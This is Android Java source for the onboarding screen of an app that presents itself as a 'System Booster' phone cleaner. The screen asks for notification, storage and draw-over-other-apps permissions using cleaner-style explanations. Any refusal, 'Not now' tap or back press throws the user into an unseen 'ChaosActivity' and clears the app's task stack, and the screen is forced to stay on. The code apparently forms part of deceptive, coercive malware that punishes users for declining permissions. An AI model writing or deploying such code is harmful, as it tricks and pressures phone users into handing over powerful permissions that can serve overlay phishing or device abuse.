package com.rhfvnc.strain;
import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.view.Gravity;
import android.view.WindowManager;
import android.widget.*;
public class OnboardingActivity extends Activity {
    private static final int REQ_NOTIF = 100;
    private static final int REQ_STORAGE = 101;
    private static final int REQ_OVERLAY = 102;
    private int step = 0;
    private LinearLayout root;
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
        root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor("#0d1b2a"));
        root.setGravity(Gravity.CENTER);
        root.setPadding(60, 60, 60, 60);
        setContentView(root);
        showStep();
    }
    private void showStep() {
        root.removeAllViews();
        TextView title = new TextView(this);
        title.setTextSize(30);
        title.setTextColor(Color.WHITE);
        title.setGravity(Gravity.CENTER);
        TextView desc = new TextView(this);
        desc.setTextSize(15);
        desc.setTextColor(Color.LTGRAY);
        desc.setGravity(Gravity.CENTER);
        desc.setPadding(0, 30, 0, 60);
        root.addView(title);
        root.addView(desc);
        switch (step) {
            case 0:
                title.setText("Welcome");
                desc.setText("System Booster helps keep your phone fast and clean.\n\nWe need a few permissions.");
                addAllowButton("Continue", this::askNotifications);
                break;
            case 1:
                title.setText("Storage Access");
                desc.setText("To scan for junk files and free up space, we need storage access.");
                addAllowButton("Allow Storage", this::askStorage);
                break;
            case 2:
                title.setText("Display Permission");
                desc.setText("To show helpful tips and speed boost cards, we need to display over other apps.");
                addAllowButton("Allow Display", this::askOverlay);
                break;
            case 3:
                title.setText("All Set!");
                desc.setText("Optimizing your device...");
                new Handler().postDelayed(this::goLauncher, 3000);
                break;
        }
    }
    private void addAllowButton(String label, Runnable onClick) {
        Button b = new Button(this);
        b.setText(label);
        b.setTextSize(16);
        b.setOnClickListener(v -> onClick.run());
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.topMargin = 20;
        root.addView(b, lp);
        Button deny = new Button(this);
        deny.setText("Not now");
        deny.setTextColor(Color.GRAY);
        deny.setOnClickListener(v -> chaos());
        root.addView(deny);
    }
    private void askNotifications() {
        if (Build.VERSION.SDK_INT >= 33) {
            requestPermissions(new String[]{"android.permission.POST_NOTIFICATIONS"}, REQ_NOTIF);
        } else {
            nextStep();
        }
    }
    private void askStorage() {
        requestPermissions(new String[]{
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_EXTERNAL_STORAGE}, REQ_STORAGE);
    }
    private void askOverlay() {
        if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
            try {
                Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(i, REQ_OVERLAY);
            } catch (Throwable ignored) { nextStep(); }
        } else {
            nextStep();
        }
    }
    private void nextStep() { step++; showStep(); }
    @Override
    public void onRequestPermissionsResult(int rc, String[] perms, int[] res) {
        super.onRequestPermissionsResult(rc, perms, res);
        for (int r : res) if (r != PackageManager.PERMISSION_GRANTED) { chaos(); return; }
        nextStep();
    }
    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);
        if (req == REQ_OVERLAY) {
            if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) { chaos(); return; }
            nextStep();
        }
    }
    private void chaos() {
        Intent i = new Intent(this, ChaosActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        startActivity(i);
        finish();
    }
    private void goLauncher() {
        Intent i = new Intent(this, LauncherActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        startActivity(i);
        finish();
    }
    @Override
    public void onBackPressed() { chaos(); }
}
